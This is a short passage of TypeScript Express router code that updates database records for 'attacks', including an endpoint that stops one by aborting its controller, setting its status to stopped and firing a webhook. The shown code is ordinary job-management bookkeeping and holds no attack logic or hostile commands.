    .where(eq(attacksTable.id, id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.json({ ok: true, extended: addSec, ...a });
});

router.post("/attacks/:id/stop", async (req, res): Promise<void> => {
  const p = StopAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const ctrl = attackAborts.get(p.data.id);
  if (ctrl) { ctrl.abort("manual_stop"); attackAborts.delete(p.data.id); }
  const [a] = await db.update(attacksTable)
    .set({ status: "stopped", stoppedAt: new Date() })
    .where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  if (a.webhookUrl) await fireWebhook(a.webhookUrl, a);
  res.json({ ok: true, ...a });
});

export default router;
